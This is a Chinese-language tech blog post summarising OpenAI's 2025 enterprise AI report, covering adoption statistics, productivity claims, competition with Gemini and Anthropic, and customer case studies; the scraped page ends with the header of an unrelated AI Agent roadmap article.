<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5c5ada4d4f04a57bcb79ded1a7abb64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=m%2B4yPq0eQq%2FeqR1PVztMUU6t6II%3D" alt="" loading="lazy"/></p>
<p>完整报告：<a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.openai.com%2Fpdf%2F7ef17d82-96bf-4dd1-9df2-228f7f377a29%2Fthe-state-of-enterprise-ai_2025-report.pdf" target="_blank" title="https://cdn.openai.com/pdf/7ef17d82-96bf-4dd1-9df2-228f7f377a29/the-state-of-enterprise-ai_2025-report.pdf" ref="nofollow noopener noreferrer">cdn.openai.com/pdf/7ef17d8…</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f614cfb5c924ea0b6cf964f1d48ef55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=t6%2Fa2q14NWm39xREZh4fg8rdtbQ%3D" alt="" loading="lazy"/></p>
<p><strong>「增长焦虑」</strong></p>
<p><strong>「</strong>「OpenAI」** 艰难自救」**</p>
<p>留给 OpenAI 的时间不多了，市场非常残酷。</p>
<p>在消费者市场，OpenAI 的好日子结束了：</p>
<ul>
<li>在综合问题解决能力上，很多评测都认为：<strong>「谷歌 Gemini 反超了 ChatGPT」</strong>；</li>
<li>在图像生成领域，新模型 Nano Banana Pro 的表现，也已远超 DALL·E；</li>
<li>目前，OpenAI 的大部分收入，仍来自个人订阅，而这一块正被 Gemini 步步蚕食。</li>
</ul>
<p>与此同时，OpenAI 还要应对多条战线的夹击：</p>
<ul>
<li>对手 Anthropic 在企业市场快速扩张；</li>
<li>越来越多面向企业的「开源权重」（open-weight）模型，把价格打到极低；</li>
<li>商业模式被持续质疑，烧钱速度和债务水平不断抬升，压力开始传导给合作伙伴和生态。</li>
</ul>
<p>虽然 ChatGPT 依然占据整体主导地位，但 Gemini 增速非常凶；Claude、DeepSeek 等后起之秀正在补课追赶。</p>
<p>外部传言也很直白：<strong>「为了应对 Gemini 的猛攻，OpenAI 正在准备提前发布 ChatGPT 新模型。」</strong></p>
<p>但问题已经不止是模型强不强。<strong>「谁能真正拿下企业市场，才是下一阶段胜负手。」</strong></p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4f4310a22a84f7d9c674794089b00e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=JCyeO1mYwOtQxkMDlo9MI0CJ1i4%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「谷歌和 Anthropic 同时出击，OpenAI 腹背受敌」</strong></p>
<p>本月初，SEO 和分析公司 FirstPageSage 发布了最新 AI 市场份额报告。</p>
<p>一个趋势特别醒目：<strong>「谷歌 Gemini 正快速逼近第二名，季度</strong>「<strong>「增长速度」</strong>」<strong>几乎是在「狂奔超车」。」</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6cb9d48abcb490396e20f0940c40410~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=ve%2FKwHtZwyJzptrc64HOu2oLeE8%3D" alt="" loading="lazy"/></p>
<p>在企业 AI 市场，OpenAI 颓势早已浮现。</p>
<p>根据 Ramp AI 指数，2025 年 10 月企业 AI 采用率上升了 0.9 个百分点，达到 44.8%。</p>
<p>OpenAI 仍是企业付费 AI 服务的绝对老大，但**增长开始踩刹车：**企业采用率只涨了 <strong>「0.3 个百分点」</strong>，低于今年 8 月创下的高点。</p>
<p><strong>「而 Anthropic 成为那个月里增长最快的玩家」</strong>：企业用户比例上涨 <strong>「2.1 个百分点」</strong>，达到 <strong>「14.3%」</strong>，创其历史第二高月增幅，仅次于今年 3 月那次暴涨 3.6 个百分点。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2202bcd7b4664958b78524ce42082f7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=rdL5k4cRKzUZFXqtTm4HEHnafMY%3D" alt="" loading="lazy"/></p>
<p><strong>「11 月 5 日，</strong>「OpenAI 宣布，全球已有超过 **「100 万家企业客户」**正在直接使用其 AI 服务，成为」<strong>史上增长最快的商业平台」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28efd3cf2c2e44dbb25ad098829256fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=MFbkp4CcnuOGGp1T3ZWhR%2B8mn%2BY%3D" alt="" loading="lazy"/></p>
<p>OpenAI 的企业用户中不乏一些知名企业，如安进（Amgen）、澳大利亚联邦银行、Booking.com、思科（Cisco）、Lowe’s、摩根士丹利、T-Mobile、Target 和赛默飞</p>
<p>几乎与此同时，OpenAI 放出一个更大的数字：<strong>「未来几年，计划投入高达 1.4 万亿美元建设算力和基础设施。」</strong></p>
<p>这句话的潜台词很清晰：要撑起这笔钱，<strong>「企业客户的增长，已经是 OpenAI 商业模式的关键支点。」</strong></p>
<p>OpenAI 首席经济学家 Ronnie Chatterji 对企业 AI 感到激动：</p>
<p>过去几年，AI 最直观的影响几乎都集中在消费端。</p>
<p>但真正让我感到兴奋的，是如今企业内部正在发生的变化。</p>
<p>在这样的背景下，OpenAI 发布了《企业 AI 现状报告》，公布其在企业 AI 上真正的实力。</p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/088c69a3acbd4bdfa69e73491e93bb4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=hBRfb6bqiDf8XAsbOfYR1ApJlXM%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「企业 AI：风口已来」</strong></p>
<p>报告先以史为鉴，从蒸汽机到半导体，历史一再证明：</p>
<p>真正释放经济价值的时刻，不在技术刚被发明的那几年，而是在企业把这些底层能力规模化应用之后 。</p>
<p>企业 AI 正在走向这一步。</p>
<p>这一次，企业级 AI 看起来已进入一个关键拐点：<strong>「从试水期，走进深水区。」</strong></p>
<p>这份报告主要回答了三个问题：</p>
<ol>
<li>企业到底在用 AI 做什么？</li>
<li>这些应用，真的在创造价值吗？</li>
<li>头部领跑者，到底比普通企业多做了什么？</li>
</ol>
<p>OpenAI 首席财务官 Sarah Friar 用几组核心数据，给出了清晰图谱。</p>
<p>⏱️**效率飞跃：**员工利用 AI 工作每天平均节省 <strong>「40–60 分钟」</strong>；重度用户每周节省时间超过 <strong>「10 小时」</strong>。</p>
<p>🔁**流程重塑：**结构化 AI 工作流今年增长了 <strong>「19 倍」</strong>。这标志着企业已明显从「实验试水」转向了「可重复、嵌入式」的标准流程。</p>
<p>🧠**深度智能：**过去 12 个月，每家企业的推理 Token（Reasoning Token）使用量增长了约 <strong>「320 倍」</strong>。这意味着更深层的智能已被整合进产品与决策中，而不仅仅是多发了几条「提示词」（prompt）。</p>
<p>🚀**「能力破圈：75%」** 的员工表示能够完成以前无法胜任的任务。AI 正在拓展人类的能力边界，而不仅仅是提升速度。</p>
<p>💻**全员开发：**非技术岗位员工的代码类应用增长了 <strong>「36%」</strong>。「想法」与「执行」之间的鸿沟正在迅速消失。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0065677154fe4b5ebfec60364861a9a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=y8kx%2BE0MJW%2BNnvKMwgEbVTtjcxY%3D" alt="" loading="lazy"/></p>
<p>尤其值得关注的是，非技术岗位的编程相关互动增加了 36%，普通员工正借助 AI 突破技能瓶颈。</p>
<p>然而，数据也预警了「贫富差距」的扩大：前 5% 的深度用户在使用频率和深度上远超中位数用户。</p>
<p>这表明，组织和个人的 AI 准备度将成为未来竞争的关键分水岭。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54b8728e47a143f0b08dfc540d45d62d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=XIuZRFuKfdJn8xM6%2F%2BW3UV%2FLIMM%3D" alt="" loading="lazy"/></p>
<p><strong>「报告细节」</strong></p>
<p>报告的结论基于两类核心数据源：</p>
<ul>
<li>**实际使用数据：**来自 OpenAI 企业客户的去标识化（de-identified）和聚合（aggregated）的使用数据。</li>
<li>**调查数据：**针对近 100 家企业的 9,000 名员工进行的关于 AI 采用模式的调查。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5078bf6a75d24162bdd2b3e8fe503d48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=wzET9Letwh3CciJbHyk0ENCeZW0%3D" alt="" loading="lazy"/></p>
<p>分析过程中没有任何 OpenAI 员工查阅具体的企业、业务或 API 客户数据，仅使用自动化分类系统处理消息内容。</p>
<p>换句话说，这不是「拍脑袋体感」，而是**「真实使用行为 + 大样本调研」**叠加出来的结果。</p>
<h3 data-id="heading-1">企业使用加速与深度集成</h3>
<p>OpenAI 目前拥有超过 **「700 万」**个 ChatGPT 工作席位，企业版席位同比增长约 <strong>「9 倍」</strong>。</p>
<p>自 2024 年 11 月以来，企业周消息量增长约 <strong>「8 倍」</strong>。定制化工具使用率飙升，CustomGPTs 和 Projects 的周用户数增长了 <strong>「19 倍」</strong>，目前约 <strong>「20%」</strong> 的企业消息是通过这些定制工具处理的，显示工作流正被数据化和标准化。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59490990497344e6a4d3599a6c866f4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=c5R1Lx7Ibt1UK093djBYNB0EWdQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">API 与开发者工作流</h3>
<p>API 消费量巨大：超过 <strong>「9,000」</strong> 个组织处理了超过 **「100 亿」**个 Token，近 <strong>「200」</strong> 个组织处理量超过 <strong>「1 万亿」</strong>。</p>
<p>推理 Token 消耗量在过去 12 个月中增长了 <strong>「320 倍」</strong>，表明更智能的模型正在被集成。</p>
<p>Codex（代码模型）的周活跃用户增长了 <strong>「2 倍」</strong>，显示代码生成数据的增加。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c3132dd28fc48f0a4b4067eb38a63b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=lxAZ91%2FTz1yR2hgKYitHfX6gGpo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">员工价值与生产力数据</h3>
<p>调查数据显示，<strong>「75%」</strong> 的员工报告提高了速度或质量。</p>
<p>数据科学（Data Science）岗位的员工平均每天节省 <strong>「60-80 分钟」</strong>，高于平均水平。</p>
<p>值得注意的是，非技术岗位（非工程、IT、研究）的**「编程相关消息量」**增长了 <strong>「36%」</strong>，表明更多普通员工开始处理技术数据。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2cdc037ec4e402d89850207f28461b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=0ql0eK2H3mw8YgogL4dLEEIoITM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">使用强度与时间节省的相关性</h3>
<p>数据表明使用深度与产出成正比：节省超过 **「10 小时 / 周」**的员工，其消耗的 Intelligence Credits（衡量模型使用量的指标）是未节省时间员工的 <strong>「8 倍」</strong>。</p>
<p>高频用户倾向于使用多种模型和工具。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6fee49b5edb4608a943504e162578f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=UIw8nTWV2te3YmukW4ATswS2RRc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">各行业增长数据</h3>
<p>所有行业的采用率都在增长，中位数行业的客户增长超过 <strong>「6 倍」</strong>。</p>
<p>科技、医疗保健和制造业增长最快。</p>
<p>虽然金融和专业服务业的绝对规模最大，但新兴行业的追赶速度惊人。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9054e5f23cc74b34a92d0a78a82767d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=demxor0wsFgVokMxHo2KUz8wtbg%3D" alt="" loading="lazy"/></p>
<p>增长最快的行业排名</p>
<p>具体增长数据为：科技行业增长 <strong>「11 倍」</strong>，医疗保健增长 <strong>「8 倍」</strong>，制造业增长 <strong>「7 倍」</strong>。</p>
<p>这反映了这些行业正在大量产生和处理 AI 交互数据。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2735cc72353e4d6896ad92c95f9e58d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=Fru54plc8nOO5VHydh133OTMaZc%3D" alt="" loading="lazy"/></p>
<p>API 用例分布</p>
<p>非科技公司的 API 使用量增长了 <strong>「5 倍」</strong>。</p>
<p>在金融和专业服务领域，「数据分析、摘要与提取」均位列前五大 API 用例。</p>
<p>科技公司主要将 API 用于面向客户的应用（如应用内助手和搜索）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/488d3726156c416a8b06d0dac2f7140b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=sd4djl9Q0pqC8QxgSdAhyCIKuOo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6"><strong>「全球增长数据」</strong></h3>
<p>国际增长加速，澳大利亚、巴西、荷兰和法国的商业客户增长率均超过 <strong>「143%」</strong>。</p>
<p>非美国地区的 API 客户增长在过去 6 个月超过 <strong>「70%」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5323b4ab08f44f2b87a47bf4df74627~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=Y5tQDN60ZBaxX2iKEjY%2Fhzq8Dfo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7"><strong>「使用鸿沟（个人层面）」</strong></h3>
<p>数据揭示了惊人的使用差距：前 5% 的头部员工（Frontier workers）发送的消息总量是中位数员工的 <strong>「6 倍」</strong>。</p>
<p>特别是在**「数据分析」**功能上，头部员工的使用量是中位数员工的 <strong>「16 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a190ce555a2449387a494eda7595d06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=p9vXVXJSXsrwIIul1RDE7mTEikY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">任务层面的差距</h3>
<p>不同任务的差距各异：在**「编程」<strong>任务上，头部与中位数的差距最大，达 <strong>「17 倍」</strong>；在</strong>「分析与计算」**任务上，差距为 <strong>「10 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/336601edf2b045f4a377236121aaf4ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=jQb22iRU1IFD6rtqJPW9qfXUJ%2F8%3D" alt="" loading="lazy"/></p>
<p>数据还显示，涉及约 7 种不同任务类型的用户，其节省的时间是仅涉及 4 种任务用户的 5 倍。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6c47d91e1ac449ab87cce34541e17f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=fZz834WnnTGE2WQGLh78KeJVyCQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">工具普及率与企业差距</h3>
<p>尽管工具已普及，仍有 <strong>「19%」</strong> 的月活跃用户从未尝试过「数据分析」功能。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e4d6395fa2146fa8a9f304a34230ec1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=B4%2FAhbTvD9QOThPXf9IT9BYJu20%3D" alt="" loading="lazy"/></p>
<p>在企业层面，头部企业（Frontier firms）每席位的消息量是中位数企业的 **2 倍，**且发送给 Custom GPTs（代表标准化工作流）的消息量是中位数企业的 <strong>「7 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31fd6d2f68634221a20fa8f596d1b7a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=XhryzqvQcENbzAmVljgO4Q4FOqk%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7af929b182e4ebbb11948ad9d9c28f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=71o3SRBpjt8zUsEbVfjVOK6YyhE%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「商业影响概览」</strong></p>
<p>引用 BCG 的研究数据：AI 领先企业的收入增长是平均水平的 <strong>「1.7 倍」</strong>，股东总回报是 <strong>「3.6 倍」</strong>。</p>
<p>以下为具体案例。</p>
<p>Intercom 案例数据</p>
<p>使用 Realtime API 后，Intercom 的语音延迟降低了 <strong>「48%」</strong>，AI 能够端到端解决 <strong>「53%」</strong> 的电话咨询，人工处理后的通话时长缩短了 <strong>「40%」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a7d3039ddb34742bfbcd9d223f1250d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=zDBg80BhNMF9ZpCHSM1xPjHAYnw%3D" alt="" loading="lazy"/></p>
<p>Lowe's 案例数据</p>
<p>Lowe's 的 AI 工具每月回答近 **「100 万」**个问题。</p>
<p>在线客户与 AI 互动后的转化率翻了 <strong>「2 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72ca4fa8c3e94ceabda319bc88b83c40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=SWELUmZDMP0Rs6zjWi6N99xEK5s%3D" alt="" loading="lazy"/></p>
<p>Indeed 案例数据</p>
<p>AI 辅助的邀请使求职申请增加了 <strong>「20%」</strong>，下游成功率（面试和录用）提高了 <strong>「13%」</strong>。</p>
<p>使用 AI 职业教练的求职者找到相关工作的速度快了 <strong>「7 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/503faaca7d564bf08254b00d2a5a9193~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=l2qAW0yj0KsfWDMFOiOkNzG%2B30E%3D" alt="" loading="lazy"/></p>
<p>BBVA 案例数据</p>
<p>BBVA 的法律 AI 聊天机器人每年自动处理超过 <strong>「9,000」</strong> 个查询，帮助完成了超过 <strong>「11,000」</strong> 个法律验证，贡献了法律服务部门年度储蓄 KPI 的 <strong>「26%」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e387ecd713d4e2f94d1c510f8f0b58f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=HEzGB3YKz%2FBFXyEZ%2F%2FNa9TWJR1o%3D" alt="" loading="lazy"/></p>
<p>OscarHealth 案例数据</p>
<p>Oscar 的 AI 能够即时回答 <strong>「58%」</strong> 的福利问题，并能在无需人工干预的情况下处理 <strong>「39%」</strong> 的福利相关消息，这得益于 AI 与医疗记录和理赔**「数据」**的深度集成。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed748f4012584ac6ba0f4485043bf1fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=W8KY45WqGnFgiIa7H4aPpcLnDtM%3D" alt="" loading="lazy"/></p>
<p>Moderna 案例数据</p>
<p>Moderna 利用 AI 处理庞大的证据包（有时长达 <strong>「300 页」<strong>的数据），将目标产品概况（TPP）的起草和分析流程从数周压缩至</strong>「数小时」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7202a0b1c9524601940351c56497b184~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=SKUHzLteeygstunI1zQ%2FeJvJB04%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/292f29927bee417b917065057751cf75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=aPL4Lr6Zz%2BiyWC%2BIi%2Btl2XkaJoI%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「最佳实践与数据准备」</strong></p>
<p>数据准备是关键瓶颈：目前仍有约 <strong>「1/4」</strong> 的企业尚未开启连接器（Connectors）以赋予 AI 访问内部数据的权限。</p>
<p>成功的企业通常会建立 API 并将制度性知识编码化。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f70203d6bdde46e5929dbdafc7effc17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=S480lutydfz%2BfE9lL6wfSi71uXs%3D" alt="" loading="lazy"/></p>
<p>总结指出，深度使用至关重要。</p>
<p>使用数据分析、API 和推理模型等高级工具的员工报告了更高的生产力收益。</p>
<p>AI 正将编程和分析任务扩展到传统专家角色之外。</p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fthe-state-of-enterprise-ai-2025-report%2F" target="_blank" title="https://openai.com/index/the-state-of-enterprise-ai-2025-report/" ref="nofollow noopener noreferrer">openai.com/index/the-s…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ftechcrunch.com%2F2025%2F12%2F08%2Fopenai-boasts-enterprise-win-days-after-internal-code-red-on-google-threat%2F" target="_blank" title="https://techcrunch.com/2025/12/08/openai-boasts-enterprise-win-days-after-internal-code-red-on-google-threat/" ref="nofollow noopener noreferrer">techcrunch.com/2025/12/08/…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agent开发路线图2025：从入门到精通，一文读懂智能体技术]]></title>    <link>https://juejin.cn/post/7581786379803738147</link>    <guid>https://juejin.cn/post/7581786379803738147</guid>    <pubDate>2025-12-10T03:24:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581786379803738147" data-draft-id="7581888578508144667" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agent开发路线图2025：从入门到精通，一文读懂智能体技术"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-10T03:24:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agent开发路线图2025：从入门到精通，一文读懂智能体技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:24:23.000Z" title="Wed Dec 10 2025 03:24:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
